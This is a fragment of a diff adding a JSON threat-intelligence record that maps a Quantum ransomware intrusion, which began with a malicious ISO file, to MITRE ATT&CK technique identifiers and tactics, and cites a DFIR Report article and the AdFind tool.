+   "attackPatternId": "attack-pattern--b17a1a56-e99c-403c-8948-561df0cffe81",
+   "attackTactic": "defense-evasion",
+   "attackType": "enterprise_tactics",
+   "id": null,
+   "mitreId": "T1078",
+   "params": null
+  },
+  {
+   "attackName": "Valid Accounts",
+   "attackPatternId": "attack-pattern--b17a1a56-e99c-403c-8948-561df0cffe81",
+   "attackTactic": "persistence",
+   "attackType": "enterprise_tactics",
+   "id": null,
+   "mitreId": "T1078",
+   "params": null
+  },
+  {
+   "attackName": "Valid Accounts",
+   "attackPatternId": "attack-pattern--b17a1a56-e99c-403c-8948-561df0cffe81",
+   "attackTactic": "privilege-escalation",
+   "attackType": "enterprise_tactics",
+   "id": null,
+   "mitreId": "T1078",
+   "params": null
+  },
+  {
+   "attackName": "Valid Accounts",
+   "attackPatternId": "attack-pattern--b17a1a56-e99c-403c-8948-561df0cffe81",
+   "attackTactic": "initial-access",
+   "attackType": "enterprise_tactics",
+   "id": null,
+   "mitreId": "T1078",
+   "params": null
+  },
+  {
+   "attackName": "File and Directory Discovery",
+   "attackPatternId": "attack-pattern--7bc57495-ea59-4380-be31-a64af124ef18",
+   "attackTactic": "discovery",
+   "attackType": "enterprise_tactics",
+   "id": null,
+   "mitreId": "T1083",
+   "params": null
+  },
+  {
+   "attackName": "[Remote Services->Remote Desktop Protocol]",
+   "attackPatternId": "attack-pattern--eb062747-2193-45de-8fa2-e62549c37ddf",
+   "attackTactic": "lateral-movement",
+   "attackType": "enterprise_tactics",
+   "id": null,
+   "mitreId": "T1021.001",
+   "params": null
+  },
+  {
+   "attackName": "Remote Services",
+   "attackPatternId": "attack-pattern--54a649ff-439a-41a4-9856-8d144a2551ba",
+   "attackTactic": "lateral-movement",
+   "attackType": "enterprise_tactics",
+   "id": null,
+   "mitreId": "T1021",
+   "params": null
+  },
+  {
+   "attackName": "[Remote Services->SMB/Windows Admin Shares]",
+   "attackPatternId": "attack-pattern--4f9ca633-15c5-463c-9724-bdcd54fde541",
+   "attackTactic": "lateral-movement",
+   "attackType": "enterprise_tactics",
+   "id": null,
+   "mitreId": "T1021.002",
+   "params": null
+  },
+  {
+   "attackName": "Lateral Tool Transfer",
+   "attackPatternId": "attack-pattern--bf90d72c-c00b-45e3-b3aa-68560560d4c5",
+   "attackTactic": "lateral-movement",
+   "attackType": "enterprise_tactics",
+   "id": null,
+   "mitreId": "T1570",
+   "params": null
+  },
+  {
+   "attackName": "[Remote Services->Windows Remote Management]",
+   "attackPatternId": "attack-pattern--60d0c01d-e2bf-49dd-a453-f8a9c9fa6f65",
+   "attackTactic": "lateral-movement",
+   "attackType": "enterprise_tactics",
+   "id": null,
+   "mitreId": "T1021.006",
+   "params": null
+  },
+  {
+   "attackName": "[Data Staged->Local Data Staging]",
+   "attackPatternId": "attack-pattern--1c34f7aa-9341-4a48-bfab-af22e51aca6c",
+   "attackTactic": "collection",
+   "attackType": "enterprise_tactics",
+   "id": null,
+   "mitreId": "T1074.001",
+   "params": null
+  },
+  {
+   "attackName": "Data Staged",
+   "attackPatternId": "attack-pattern--7dd95ff6-712e-4056-9626-312ea4ab4c5e",
+   "attackTactic": "collection",
+   "attackType": "enterprise_tactics",
+   "id": null,
+   "mitreId": "T1074",
+   "params": null
+  },
+  {
+   "attackName": "[Application Layer Protocol->Web Protocols]",
+   "attackPatternId": "attack-pattern--df8b2a25-8bdf-4856-953c-a04372b1c161",
+   "attackTactic": "command-and-control",
+   "attackType": "enterprise_tactics",
+   "id": null,
+   "mitreId": "T1071.001",
+   "params": null
+  },
+  {
+   "attackName": "Application Layer Protocol",
+   "attackPatternId": "attack-pattern--355be19c-ffc9-46d5-8d50-d6a036c675b6",
+   "attackTactic": "command-and-control",
+   "attackType": "enterprise_tactics",
+   "id": null,
+   "mitreId": "T1071",
+   "params": null
+  },
+  {
+   "attackName": "[Exfiltration Over Web Service->Exfiltration to Cloud Storage]",
+   "attackPatternId": "attack-pattern--bf1b6176-597c-4600-bfcd-ac989670f96b",
+   "attackTactic": "exfiltration",
+   "attackType": "enterprise_tactics",
+   "id": null,
+   "mitreId": "T1567.002",
+   "params": null
+  },
+  {
+   "attackName": "Exfiltration Over Web Service",
+   "attackPatternId": "attack-pattern--40597f16-0963-4249-bf4c-ac93b7fb9807",
+   "attackTactic": "exfiltration",
+   "attackType": "enterprise_tactics",
+   "id": null,
+   "mitreId": "T1567",
+   "params": null
+  },
+  {
+   "attackName": "Data Encrypted for Impact",
+   "attackPatternId": "attack-pattern--b80d107d-fa0d-4b60-9684-b0433e8bdba0",
+   "attackTactic": "impact",
+   "attackType": "enterprise_tactics",
+   "id": null,
+   "mitreId": "T1486",
+   "params": null
+  },
+  {
+   "attackName": "Account Access Removal",
+   "attackPatternId": "attack-pattern--b24e2a20-3b3d-4bf0-823b-1ed765398fb0",
+   "attackTactic": "impact",
+   "attackType": "enterprise_tactics",
+   "id": null,
+   "mitreId": "T1531",
+   "params": null
+  },
+  {
+   "attackName": "[Impair Defenses->Disable or Modify Tools]",
+   "attackPatternId": "attack-pattern--ac08589e-ee59-4935-8667-d845e38fe579",
+   "attackTactic": "defense-evasion",
+   "attackType": "enterprise_tactics",
+   "id": null,
+   "mitreId": "T1562.001",
+   "params": null
+  },
+  {
+   "attackName": "Impair Defenses",
+   "attackPatternId": "attack-pattern--3d333250-30e4-4a82-9edc-756c68afc529",
+   "attackTactic": "defense-evasion",
+   "attackType": "enterprise_tactics",
+   "id": null,
+   "mitreId": "T1562",
+   "params": null
+  },
+  {
+   "attackName": "[Subvert Trust Controls->Mark-of-the-Web Bypass]",
+   "attackPatternId": "attack-pattern--7e7c2fba-7cca-486c-9582-4c1bb2851961",
+   "attackTactic": "defense-evasion",
+   "attackType": "enterprise_tactics",
+   "id": null,
+   "mitreId": "T1553.005",
+   "params": null
+  },
+  {
+   "attackName": "Subvert Trust Controls",
+   "attackPatternId": "attack-pattern--b83e166d-13d7-4b52-8677-dff90c548fd7",
+   "attackTactic": "defense-evasion",
+   "attackType": "enterprise_tactics",
+   "id": null,
+   "mitreId": "T1553",
+   "params": null
+  },
+  {
+   "attackName": "System Owner/User Discovery",
+   "attackPatternId": "attack-pattern--03d7999c-1f4c-42cc-8373-e7690d318104",
+   "attackTactic": "discovery",
+   "attackType": "enterprise_tactics",
+   "id": null,
+   "mitreId": "T1033",
+   "params": null
+  }
+ ],
+ "oldId": null,
+ "regions": [],
+ "relatedThreatActors": [],
+ "reportNumber": "CP-2707-1655",
+ "sectors": [],
+ "seqPublish": null,
+ "seqUpdate": 16951702848419,
+ "shortDescription": null,
+ "shortTitle": null,
+ "sourceList": [
+  {
+   "id": "https://thedfirreport.com/2023/04/03/malicious-iso-file-leads-to-domain-wide-ransomware/",
+   "datePublished": "2023-10-29"
+  }
+ ],
+ "sources": [
+  "https://thedfirreport.com/2023/04/03/malicious-iso-file-leads-to-domain-wide-ransomware/"
+ ],
+ "targetDomain": [],
+ "targetedCompany": [],
+ "targetedPartnersAndClients": [],
+ "techSeqUpdate": null,
+ "threatActor": {
+  "country": null,
+  "id": "3d86fa0fce495ea07d119f7e381e1c857b69de29",
+  "isAPT": false,
+  "name": "Quantum"
+ },
+ "title": "Malicious ISO File Leads to Quantum infection",
+ "toolList": [
+  {
+   "id": "1f21cb2fdd76159d7e5b387c8541181e009fbf35",
+   "name": "AdFind"
+  }
+ ],
+ "type": "event",
+ "unreliableIndicators": [],
+ "unreliableIndicatorsRelations": [],
+ "updatedAt": "2023-09-20T03:38:04+03:00"
+}
